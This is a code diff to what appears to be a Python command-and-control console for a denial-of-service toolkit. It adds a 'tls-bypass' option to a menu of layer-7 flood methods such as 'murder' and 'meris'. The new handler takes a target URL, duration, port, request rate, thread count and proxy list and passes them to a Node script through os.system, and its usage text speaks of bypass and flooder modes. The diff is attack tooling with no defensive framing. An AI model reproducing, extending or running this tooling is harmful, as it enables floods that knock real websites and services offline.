@@ -159,6 +159,7 @@ def layer7():
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mspike               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpget           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-requests       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtornado           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mmeris               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mmurder            \x1b[38;2;0;212;14m║
+               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtls-bypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m<coming soon>     \x1b[38;2;0;212;14m║
           \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
 ''')
 
@@ -620,6 +621,19 @@ def main():
             except IndexError:
                 print('Usage: murder <url> <time> <thread> <proxy> <rps>')
                 print('Example: murder http or https://example.com 1000 500 proxy.txt 512')
+
+        elif "tls-bypass" in cnc:
+            try:
+                url = cnc.split()[1]
+                time = cnc.split()[2]  
+                port = cnc.split()[3]
+                rps = cnc.split()[4]
+                thread = cnc.split()[5]
+                proxy = cnc.split()[5]
+                os.system(f'node tls-bypass.js {url} {time} {port} {rps} {thread} {proxy}')
+            except IndexError:
+                print('Usage: tls-bypass <url> <time> <port> <rps> <thread> <proxy> <bypass/flooder>')
+                print('Example: tls-bypass http or https://example.com 300 443/80 120 10 http.txt bypass/flooder')
                 
 # TOOLS
         elif "geoip" in cnc:
